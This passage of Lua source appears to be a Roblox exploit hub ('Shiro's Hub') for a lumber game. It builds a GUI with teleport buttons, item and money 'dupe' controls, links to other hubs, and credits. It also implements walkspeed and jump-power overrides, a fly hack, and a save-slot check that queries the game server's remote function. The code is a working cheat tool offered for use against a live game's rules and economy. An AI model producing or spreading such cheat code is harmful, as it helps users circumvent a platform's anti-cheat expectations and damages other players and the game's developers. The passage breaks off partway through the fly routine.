StoreWoodRUs.Size = UDim2.new(0, 73, 0, 40)
StoreWoodRUs.Font = Enum.Font.SourceSans
StoreWoodRUs.Text = "WoodRUs"
StoreWoodRUs.TextColor3 = Color3.fromRGB(255, 255, 255)
StoreWoodRUs.TextScaled = true
StoreWoodRUs.TextSize = 14.000
StoreWoodRUs.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
StoreWoodRUs.TextWrapped = true

StoreLand.Name = "StoreLand"
StoreLand.Parent = TPFrame
StoreLand.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
StoreLand.BorderSizePixel = 0
StoreLand.Position = UDim2.new(0.0199999809, 0, 0.216666669, 0)
StoreLand.Size = UDim2.new(0, 73, 0, 40)
StoreLand.Font = Enum.Font.SourceSans
StoreLand.Text = "Land Store"
StoreLand.TextColor3 = Color3.fromRGB(255, 255, 255)
StoreLand.TextScaled = true
StoreLand.TextSize = 14.000
StoreLand.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
StoreLand.TextWrapped = true

StoreCars.Name = "StoreCars"
StoreCars.Parent = TPFrame
StoreCars.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
StoreCars.BorderSizePixel = 0
StoreCars.Position = UDim2.new(0.0199999996, 0, 0.415833324, 0)
StoreCars.Size = UDim2.new(0, 73, 0, 40)
StoreCars.Font = Enum.Font.SourceSans
StoreCars.Text = "Boxed Cars"
StoreCars.TextColor3 = Color3.fromRGB(255, 255, 255)
StoreCars.TextScaled = true
StoreCars.TextSize = 14.000
StoreCars.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
StoreCars.TextWrapped = true

GreenBox.Name = "GreenBox"
GreenBox.Parent = TPFrame
GreenBox.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
GreenBox.BorderSizePixel = 0
GreenBox.Position = UDim2.new(0.0199999996, 0, 0.80583334, 0)
GreenBox.Size = UDim2.new(0, 73, 0, 40)
GreenBox.Font = Enum.Font.SourceSans
GreenBox.Text = "Green Box"
GreenBox.TextColor3 = Color3.fromRGB(255, 255, 255)
GreenBox.TextScaled = true
GreenBox.TextSize = 14.000
GreenBox.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
GreenBox.TextWrapped = true

StoreFancy.Name = "StoreFancy"
StoreFancy.Parent = TPFrame
StoreFancy.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
StoreFancy.BorderSizePixel = 0
StoreFancy.Position = UDim2.new(0.0199999996, 0, 0.614166677, 0)
StoreFancy.Size = UDim2.new(0, 73, 0, 40)
StoreFancy.Font = Enum.Font.SourceSans
StoreFancy.Text = "Fancy Furnishings"
StoreFancy.TextColor3 = Color3.fromRGB(255, 255, 255)
StoreFancy.TextScaled = true
StoreFancy.TextSize = 14.000
StoreFancy.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
StoreFancy.TextWrapped = true

StoreLogic.Name = "StoreLogic"
StoreLogic.Parent = TPFrame
StoreLogic.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
StoreLogic.BorderSizePixel = 0
StoreLogic.Position = UDim2.new(0.26699999, 0, 0.0250000004, 0)
StoreLogic.Size = UDim2.new(0, 73, 0, 40)
StoreLogic.Font = Enum.Font.SourceSans
StoreLogic.Text = "Link's Logic"
StoreLogic.TextColor3 = Color3.fromRGB(255, 255, 255)
StoreLogic.TextScaled = true
StoreLogic.TextSize = 14.000
StoreLogic.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
StoreLogic.TextWrapped = true

Spawn.Name = "Spawn"
Spawn.Parent = TPFrame
Spawn.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Spawn.BorderSizePixel = 0
Spawn.Position = UDim2.new(0.504999995, 0, 0.0250000004, 0)
Spawn.Size = UDim2.new(0, 73, 0, 40)
Spawn.Font = Enum.Font.SourceSans
Spawn.Text = "Spawn"
Spawn.TextColor3 = Color3.fromRGB(255, 255, 255)
Spawn.TextScaled = true
Spawn.TextSize = 14.000
Spawn.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Spawn.TextWrapped = true

IceWood.Name = "IceWood"
IceWood.Parent = TPFrame
IceWood.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
IceWood.BorderSizePixel = 0
IceWood.Position = UDim2.new(0.753000021, 0, 0.0250000004, 0)
IceWood.Size = UDim2.new(0, 73, 0, 40)
IceWood.Font = Enum.Font.SourceSans
IceWood.Text = "Ice Wood"
IceWood.TextColor3 = Color3.fromRGB(255, 255, 255)
IceWood.TextScaled = true
IceWood.TextSize = 14.000
IceWood.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
IceWood.TextWrapped = true

Lodge.Name = "Lodge"
Lodge.Parent = TPFrame
Lodge.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Lodge.BorderSizePixel = 0
Lodge.Position = UDim2.new(0.26699999, 0, 0.805999994, 0)
Lodge.Size = UDim2.new(0, 73, 0, 40)
Lodge.Font = Enum.Font.SourceSans
Lodge.Text = "Lodge"
Lodge.TextColor3 = Color3.fromRGB(255, 255, 255)
Lodge.TextScaled = true
Lodge.TextSize = 14.000
Lodge.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Lodge.TextWrapped = true

Dock.Name = "Dock"
Dock.Parent = TPFrame
Dock.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Dock.BorderSizePixel = 0
Dock.Position = UDim2.new(0.504999995, 0, 0.805999994, 0)
Dock.Size = UDim2.new(0, 73, 0, 40)
Dock.Font = Enum.Font.SourceSans
Dock.Text = "Dock"
Dock.TextColor3 = Color3.fromRGB(255, 255, 255)
Dock.TextScaled = true
Dock.TextSize = 14.000
Dock.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Dock.TextWrapped = true

Bridge.Name = "Bridge"
Bridge.Parent = TPFrame
Bridge.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Bridge.BorderSizePixel = 0
Bridge.Position = UDim2.new(0.753000021, 0, 0.805999994, 0)
Bridge.Size = UDim2.new(0, 73, 0, 40)
Bridge.Font = Enum.Font.SourceSans
Bridge.Text = "Bridge"
Bridge.TextColor3 = Color3.fromRGB(255, 255, 255)
Bridge.TextScaled = true
Bridge.TextSize = 14.000
Bridge.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Bridge.TextWrapped = true

Cave.Name = "Cave"
Cave.Parent = TPFrame
Cave.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Cave.BorderSizePixel = 0
Cave.Position = UDim2.new(0.753000021, 0, 0.614000022, 0)
Cave.Size = UDim2.new(0, 73, 0, 40)
Cave.Font = Enum.Font.SourceSans
Cave.Text = "Cave"
Cave.TextColor3 = Color3.fromRGB(255, 255, 255)
Cave.TextScaled = true
Cave.TextSize = 14.000
Cave.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Cave.TextWrapped = true

StrangeMan.Name = "StrangeMan"
StrangeMan.Parent = TPFrame
StrangeMan.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
StrangeMan.BorderSizePixel = 0
StrangeMan.Position = UDim2.new(0.26699999, 0, 0.614000022, 0)
StrangeMan.Size = UDim2.new(0, 73, 0, 40)
StrangeMan.Font = Enum.Font.SourceSans
StrangeMan.Text = "Strange Man"
StrangeMan.TextColor3 = Color3.fromRGB(255, 255, 255)
StrangeMan.TextScaled = true
StrangeMan.TextSize = 14.000
StrangeMan.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
StrangeMan.TextWrapped = true

YellowWood.Name = "YellowWood"
YellowWood.Parent = TPFrame
YellowWood.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
YellowWood.BorderSizePixel = 0
YellowWood.Position = UDim2.new(0.504999995, 0, 0.614000022, 0)
YellowWood.Size = UDim2.new(0, 73, 0, 40)
YellowWood.Font = Enum.Font.SourceSans
YellowWood.Text = "Yellow Wood"
YellowWood.TextColor3 = Color3.fromRGB(255, 255, 255)
YellowWood.TextScaled = true
YellowWood.TextSize = 14.000
YellowWood.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
YellowWood.TextWrapped = true

Volcano.Name = "Volcano"
Volcano.Parent = TPFrame
Volcano.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Volcano.BorderSizePixel = 0
Volcano.Position = UDim2.new(0.504999995, 0, 0.216999993, 0)
Volcano.Size = UDim2.new(0, 73, 0, 40)
Volcano.Font = Enum.Font.SourceSans
Volcano.Text = "Volcano"
Volcano.TextColor3 = Color3.fromRGB(255, 255, 255)
Volcano.TextScaled = true
Volcano.TextSize = 14.000
Volcano.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Volcano.TextWrapped = true

Palm.Name = "Palm"
Palm.Parent = TPFrame
Palm.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Palm.BorderSizePixel = 0
Palm.Position = UDim2.new(0.753000021, 0, 0.216999993, 0)
Palm.Size = UDim2.new(0, 73, 0, 40)
Palm.Font = Enum.Font.SourceSans
Palm.Text = "Palm"
Palm.TextColor3 = Color3.fromRGB(255, 255, 255)
Palm.TextScaled = true
Palm.TextSize = 14.000
Palm.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Palm.TextWrapped = true

StoreBobs.Name = "StoreBobs"
StoreBobs.Parent = TPFrame
StoreBobs.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
StoreBobs.BorderSizePixel = 0
StoreBobs.Position = UDim2.new(0.26699999, 0, 0.416399986, 0)
StoreBobs.Size = UDim2.new(0, 73, 0, 40)
StoreBobs.Font = Enum.Font.SourceSans
StoreBobs.Text = "Bob's Shack"
StoreBobs.TextColor3 = Color3.fromRGB(255, 255, 255)
StoreBobs.TextScaled = true
StoreBobs.TextSize = 14.000
StoreBobs.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
StoreBobs.TextWrapped = true

EndTimes.Name = "EndTimes"
EndTimes.Parent = TPFrame
EndTimes.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
EndTimes.BorderSizePixel = 0
EndTimes.Position = UDim2.new(0.753000021, 0, 0.416000009, 0)
EndTimes.Size = UDim2.new(0, 73, 0, 40)
EndTimes.Font = Enum.Font.SourceSans
EndTimes.Text = "End Times"
EndTimes.TextColor3 = Color3.fromRGB(255, 255, 255)
EndTimes.TextScaled = true
EndTimes.TextSize = 14.000
EndTimes.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
EndTimes.TextWrapped = true

Swamp.Name = "Swamp"
Swamp.Parent = TPFrame
Swamp.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Swamp.BorderSizePixel = 0
Swamp.Position = UDim2.new(0.504999995, 0, 0.416000009, 0)
Swamp.Size = UDim2.new(0, 73, 0, 40)
Swamp.Font = Enum.Font.SourceSans
Swamp.Text = "Swamp"
Swamp.TextColor3 = Color3.fromRGB(255, 255, 255)
Swamp.TextScaled = true
Swamp.TextSize = 14.000
Swamp.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Swamp.TextWrapped = true

StoreFineArts.Name = "StoreFineArts"
StoreFineArts.Parent = TPFrame
StoreFineArts.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
StoreFineArts.BorderSizePixel = 0
StoreFineArts.Position = UDim2.new(0.26699999, 0, 0.216999993, 0)
StoreFineArts.Size = UDim2.new(0, 73, 0, 40)
StoreFineArts.Font = Enum.Font.SourceSans
StoreFineArts.Text = "Fine Arts"
StoreFineArts.TextColor3 = Color3.fromRGB(255, 255, 255)
StoreFineArts.TextScaled = true
StoreFineArts.TextSize = 14.000
StoreFineArts.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
StoreFineArts.TextWrapped = true

Hub.Name = "Hub"
Hub.Parent = mainframe
Hub.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Hub.BorderColor3 = Color3.fromRGB(138, 43, 226)
Hub.BorderSizePixel = 0
Hub.Position = UDim2.new(0, 0, 0.714999974, 0)
Hub.Size = UDim2.new(0, 80, 0, 40)
Hub.Font = Enum.Font.SourceSans
Hub.Text = "Hub's"
Hub.TextColor3 = Color3.fromRGB(255, 255, 255)
Hub.TextScaled = true
Hub.TextSize = 32.000
Hub.TextWrapped = true
Hub.MouseButton1Down:connect(function()
CreditsFrame.Visible = false
DupeFrame.Visible = false
HubFrame.Visible = true
MainFrame.Visible = false
PlotFrame.Visible = false
TPFrame.Visible = false
WoodFrame.Visible = false
end)

HubFrame.Name = "HubFrame"
HubFrame.Parent = Hub
HubFrame.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
HubFrame.BorderSizePixel = 0
HubFrame.Position = UDim2.new(1, 0, -4.00400019, 0)
HubFrame.Size = UDim2.new(0, 320, 0, 240)
HubFrame.Visible = false

Blood.Name = "Blood"
Blood.Parent = HubFrame
Blood.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Blood.BorderSizePixel = 0
Blood.Position = UDim2.new(0.0199999809, 0, 0.0250000004, 0)
Blood.Size = UDim2.new(0, 151, 0, 72)
Blood.Font = Enum.Font.SourceSans
Blood.Text = "Blood"
Blood.TextColor3 = Color3.fromRGB(255, 255, 255)
Blood.TextScaled = true
Blood.TextSize = 14.000
Blood.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Blood.TextWrapped = true

Venyx.Name = "Venyx"
Venyx.Parent = HubFrame
Venyx.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Venyx.BorderSizePixel = 0
Venyx.Position = UDim2.new(0.508000016, 0, 0.0250000004, 0)
Venyx.Size = UDim2.new(0, 151, 0, 72)
Venyx.Font = Enum.Font.SourceSans
Venyx.Text = "Venyx"
Venyx.TextColor3 = Color3.fromRGB(255, 255, 255)
Venyx.TextScaled = true
Venyx.TextSize = 14.000
Venyx.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Venyx.TextWrapped = true

BringUp.Name = "Bring Up"
BringUp.Parent = HubFrame
BringUp.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
BringUp.BorderSizePixel = 0
BringUp.Position = UDim2.new(0.0199999996, 0, 0.675000012, 0)
BringUp.Size = UDim2.new(0, 151, 0, 72)
BringUp.Font = Enum.Font.SourceSans
BringUp.Text = "Bring Up"
BringUp.TextColor3 = Color3.fromRGB(255, 255, 255)
BringUp.TextScaled = true
BringUp.TextSize = 14.000
BringUp.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
BringUp.TextWrapped = true

LightLumber.Name = "Light Lumber"
LightLumber.Parent = HubFrame
LightLumber.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
LightLumber.BorderSizePixel = 0
LightLumber.Position = UDim2.new(0.0199999996, 0, 0.350000024, 0)
LightLumber.Size = UDim2.new(0, 151, 0, 72)
LightLumber.Font = Enum.Font.SourceSans
LightLumber.Text = "Light Lumber"
LightLumber.TextColor3 = Color3.fromRGB(255, 255, 255)
LightLumber.TextScaled = true
LightLumber.TextSize = 14.000
LightLumber.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
LightLumber.TextWrapped = true

Ferry.Name = "Ferry"
Ferry.Parent = HubFrame
Ferry.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Ferry.BorderSizePixel = 0
Ferry.Position = UDim2.new(0.508000016, 0, 0.675000012, 0)
Ferry.Size = UDim2.new(0, 151, 0, 72)
Ferry.Font = Enum.Font.SourceSans
Ferry.Text = "Ferry"
Ferry.TextColor3 = Color3.fromRGB(255, 255, 255)
Ferry.TextScaled = true
Ferry.TextSize = 14.000
Ferry.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Ferry.TextWrapped = true

JohiroAxeDupe.Name = "JohiroAxeDupe"
JohiroAxeDupe.Parent = HubFrame
JohiroAxeDupe.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
JohiroAxeDupe.BorderSizePixel = 0
JohiroAxeDupe.Position = UDim2.new(0.508000016, 0, 0.349999994, 0)
JohiroAxeDupe.Size = UDim2.new(0, 151, 0, 72)
JohiroAxeDupe.Font = Enum.Font.SourceSans
JohiroAxeDupe.Text = "Johiro's Axe Dupe"
JohiroAxeDupe.TextColor3 = Color3.fromRGB(255, 255, 255)
JohiroAxeDupe.TextScaled = true
JohiroAxeDupe.TextSize = 14.000
JohiroAxeDupe.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
JohiroAxeDupe.TextWrapped = true

Credits.Name = "Credits"
Credits.Parent = mainframe
Credits.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Credits.BorderColor3 = Color3.fromRGB(138, 43, 226)
Credits.BorderSizePixel = 0
Credits.Position = UDim2.new(0, 0, 0.85799998, 0)
Credits.Size = UDim2.new(0, 80, 0, 40)
Credits.Font = Enum.Font.SourceSans
Credits.Text = "Credits"
Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
Credits.TextScaled = true
Credits.TextSize = 32.000
Credits.TextWrapped = true
Credits.MouseButton1Down:connect(function()
CreditsFrame.Visible = true
DupeFrame.Visible = false
HubFrame.Visible = false
MainFrame.Visible = false
PlotFrame.Visible = false
TPFrame.Visible = false
WoodFrame.Visible = false
end)

CreditsFrame.Name = "CreditsFrame"
CreditsFrame.Parent = Credits
CreditsFrame.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
CreditsFrame.BorderSizePixel = 0
CreditsFrame.Position = UDim2.new(1, 0, -5.00599957, 0)
CreditsFrame.Size = UDim2.new(0, 320, 0, 240)

MadeBy.Name = "Made By"
MadeBy.Parent = CreditsFrame
MadeBy.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
MadeBy.BackgroundTransparency = 100.000
MadeBy.BorderSizePixel = 0
MadeBy.Position = UDim2.new(0.159374997, 0, 0, 0)
MadeBy.Size = UDim2.new(0, 200, 0, 48)
MadeBy.Font = Enum.Font.GothamBold
MadeBy.Text = "Made By"
MadeBy.TextColor3 = Color3.fromRGB(255, 255, 255)
MadeBy.TextScaled = true
MadeBy.TextSize = 13.000
MadeBy.TextWrapped = true

SnowyShiro.Name = "SnowyShiro"
SnowyShiro.Parent = CreditsFrame
SnowyShiro.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
SnowyShiro.BackgroundTransparency = 100.000
SnowyShiro.BorderSizePixel = 0
SnowyShiro.Position = UDim2.new(0, 0, 0.19600004, 0)
SnowyShiro.Size = UDim2.new(0, 320, 0, 48)
SnowyShiro.Font = Enum.Font.GothamBold
SnowyShiro.Text = "SnowyShiro#0001"
SnowyShiro.TextColor3 = Color3.fromRGB(255, 255, 255)
SnowyShiro.TextSize = 27.000
SnowyShiro.TextWrapped = true

Credits_2.Name = "Credits"
Credits_2.Parent = CreditsFrame
Credits_2.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
Credits_2.BackgroundTransparency = 100.000
Credits_2.BorderSizePixel = 0
Credits_2.Position = UDim2.new(0.159374997, 0, 0.40016669, 0)
Credits_2.Size = UDim2.new(0, 200, 0, 48)
Credits_2.Font = Enum.Font.GothamBold
Credits_2.Text = "Credits"
Credits_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Credits_2.TextScaled = true
Credits_2.TextSize = 13.000
Credits_2.TextWrapped = true

AnimeCheat.Name = "AnimeCheat"
AnimeCheat.Parent = CreditsFrame
AnimeCheat.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
AnimeCheat.BackgroundTransparency = 100.000
AnimeCheat.BorderSizePixel = 0
AnimeCheat.Position = UDim2.new(0, 0, 0.596000135, 0)
AnimeCheat.Size = UDim2.new(0, 160, 0, 48)
AnimeCheat.Font = Enum.Font.GothamBold
AnimeCheat.Text = "AnimeCheat"
AnimeCheat.TextColor3 = Color3.fromRGB(255, 255, 255)
AnimeCheat.TextSize = 26.000
AnimeCheat.TextWrapped = true

Johiro.Name = "Johiro"
Johiro.Parent = CreditsFrame
Johiro.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
Johiro.BackgroundTransparency = 100.000
Johiro.BorderSizePixel = 0
Johiro.Position = UDim2.new(0.5, 0, 0.596000135, 0)
Johiro.Size = UDim2.new(0, 160, 0, 48)
Johiro.Font = Enum.Font.GothamBold
Johiro.Text = "Johiro"
Johiro.TextColor3 = Color3.fromRGB(255, 255, 255)
Johiro.TextSize = 27.000
Johiro.TextWrapped = true

Sten.Name = "Sten"
Sten.Parent = CreditsFrame
Sten.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
Sten.BackgroundTransparency = 100.000
Sten.BorderSizePixel = 0
Sten.Position = UDim2.new(0, 0, 0.800166547, 0)
Sten.Size = UDim2.new(0, 160, 0, 48)
Sten.Font = Enum.Font.GothamBold
Sten.Text = "Sten"
Sten.TextColor3 = Color3.fromRGB(255, 255, 255)
Sten.TextSize = 30.000
Sten.TextWrapped = true

Averias.Name = "Averias"
Averias.Parent = CreditsFrame
Averias.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
Averias.BackgroundTransparency = 100.000
Averias.BorderSizePixel = 0
Averias.Position = UDim2.new(0.5, 0, 0.796000063, 0)
Averias.Size = UDim2.new(0, 160, 0, 48)
Averias.Font = Enum.Font.GothamBold
Averias.Text = "Averias"
Averias.TextColor3 = Color3.fromRGB(255, 255, 255)
Averias.TextSize = 27.000
Averias.TextWrapped = true

Name.Name = "Name"
Name.Parent = mainframe
Name.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Name.BorderSizePixel = 0
Name.Position = UDim2.new(0.200000003, 0, 0, 0)
Name.Size = UDim2.new(0, 240, 0, 40)
Name.Font = Enum.Font.SourceSans
Name.Text = "Shiro's Hub"
Name.TextColor3 = Color3.fromRGB(255, 255, 255)
Name.TextScaled = true
Name.TextSize = 14.000
Name.TextWrapped = true

local function QMMS_fake_script() -- mainframe.LocalScript 
	local script = Instance.new('LocalScript', mainframe)

	script.parent.Selectable = true
	script.Parent.Active = true
	script.parent.Draggable = true
end
coroutine.wrap(QMMS_fake_script)()

local MoneyCooldown = false
local CurrentSlot = game.Players.LocalPlayer:WaitForChild("CurrentSaveSlot").Value
local ScriptLoadOrSave = false
local CurrentlySavingOrLoading = game.Players.LocalPlayer:WaitForChild("CurrentlySavingOrLoading")

local function CheckIfSlotAvailable(Slot)
	for a,b in pairs(game.ReplicatedStorage.LoadSaveRequests.GetMetaData:InvokeServer(game.Players.LocalPlayer)) do 
		if a == Slot then 
			for c,d in pairs(b) do 
				if c == "NumSaves" and d ~= 0 then 
					return true
				else
					return false
				end
			end
		end
	end
end

local function CheckSlotNumber1() --Checks if the slot number is right
    if MoneyDupeSlot.Text == "1" or MoneyDupeSlot.Text == "2" or MoneyDupeSlot.Text == "3" or MoneyDupeSlot.Text == "4" or MoneyDupeSlot.Text == "5" or MoneyDupeSlot.Text == "6" then
		local SlotNumber = tonumber(MoneyDupeSlot.Text)
		return SlotNumber
		else return false
	end
end

local function CheckSlotNumber2() --Checks if the slot number is right
    if DupeSlot.Text == "1" or DupeSlot.Text == "2" or DupeSlot.Text == "3" or DupeSlot.Text == "4" or DupeSlot.Text == "5" or DupeSlot.Text == "6" then
		local SlotNumber = tonumber(DupeSlot.Text)
		return SlotNumber
		else return false
	end
end

local function SendNotification(title,text,duration,...)
  game.StarterGui:SetCore("SendNotification", {
    Title = title;
    Text = text;
    Icon = "";
    Duration = duration;
  })
end

--Join Detecter

game.Players.ChildAdded:Connect(function(player)
  if not pcall (function()
  SendNotification("Player JOINED",""..player.Name.." has JOINED the game",5 )
  end) then
    print ("Error")
  end
  end)

--Leave Detecter
 
  game.Players.ChildRemoved:Connect(function(player)
  if not pcall (function()
  SendNotification("Player LEFT",""..player.Name.." has LEFT the game",4.4 )
  end) then
    print ("Error")
  end
  end)
  
  SendNotification("Loaded","Join and leave detector is loaded",2)

--Walkspeed

Speed.MouseButton1Down:connect(function()
while true do
    wait()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = SpeedValue.Text
end
end)

--Jumppower

Jump.MouseButton1Down:connect(function()
while true do
    wait()
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = JumpValue.Text
end
end)

--Fly

local toggle = false
	Fly.MouseButton1Click:Connect(function()
		toggle = not toggle
		Fly.TextColor3 = (toggle and Color3.fromRGB(85, 255, 127) or Color3.fromRGB(255,255,255))
		if toggle then
			flying = not flying
	repeat wait()
	until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
	local mouse = game.Players.LocalPlayer:GetMouse()
	repeat wait() until mouse
	local plr = game.Players.LocalPlayer
	local torso = plr.Character.Torso
	local deb = true
	local ctrl = {f = 0, b = 0, l = 0, r = 0}
	local lastctrl = {f = 0, b = 0, l = 0, r = 0}
	local maxspeed = 200
	local speed = 0
	if flying then
	end
	 
	function FlyFunction()
	local bg = Instance.new("BodyGyro", torso)
	bg.P = 9e4
	bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
	bg.cframe = torso.CFrame
	local bv = Instance.new("BodyVelocity", torso)
	bv.velocity = Vector3.new(0,0.1,0)
	bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
	repeat wait()
	plr.Character.Humanoid.PlatformStand = true
	if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
	speed = speed+.5+(speed/maxspeed)
	if speed > maxspeed then
	speed = maxspeed
	end
	elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
	speed = speed-1
	if speed < 0 then
	speed = 0
	end
	end
	if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
	bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
	lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
	elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
	bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
	else
	bv.velocity = Vector3.new(0,0.1,0)
	end
	bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
	until not flying
	ctrl = {f = 0, b = 0, l = 0, r = 0}
	lastctrl = {f = 0, b = 0, l = 0, r = 0}
	speed = 0
	bg:Destroy()
	bv:Destroy()
	plr.Character.Humanoid.PlatformStand = false
	end
	mouse.KeyDown:connect(function(key)
	if key:lower() == "w" then
	ctrl.f = 1
	elseif key:lower() == "s" then
	ctrl.b = -1
	elseif key:lower() == "a" then
	ctrl.l = -1
	elseif key:lower() == "d" then
	ctrl.r = 1
	 
	end
	end)
	mouse.KeyUp:connect(function(key)
	if key:lower() == "w" then
	ctrl.f = 0
	elseif key:lower() == "s" then
	ctrl.b = 0
	elseif key:lower() == "a" then
	ctrl.l = 0
	elseif key:lower() == "d" then
	ctrl.r = 0
	end
	end)
	FlyFunction()
		else
			flying = not flying
	repeat wait()
	until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
	local mouse = game.Players.LocalPlayer:GetMouse()
	repeat wait() until mouse
	local plr = game.Players.LocalPlayer
	local torso = plr.Character.Torso
	local deb = true
	local ctrl = {f = 0, b = 0, l = 0, r = 0}
	local lastctrl = {f = 0, b = 0, l = 0, r = 0}
	local maxspeed = 200
	local speed = 0
	if flying then
	end
	 
	function FlyFunction()
	local bg = Instance.new("BodyGyro", torso)
	bg.P = 9e4
	bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
	bg.cframe = torso.CFrame
	local bv = Instance.new("BodyVelocity", torso)
	bv.velocity = Vector3.new(0,0.1,0)
	bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
	repeat wait()
	plr.Character.Humanoid.PlatformStand = true
	if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
	speed = speed+.5+(speed/maxspeed)
	if speed > maxspeed then
	speed = maxspeed
	end
	elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
	speed = speed-1
	if speed < 0 then
	speed = 0
	end
	end
	if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
	bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
	lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
	elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
	bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
	else
	bv.velocity = Vector3.new(0,0.1,0)
	end
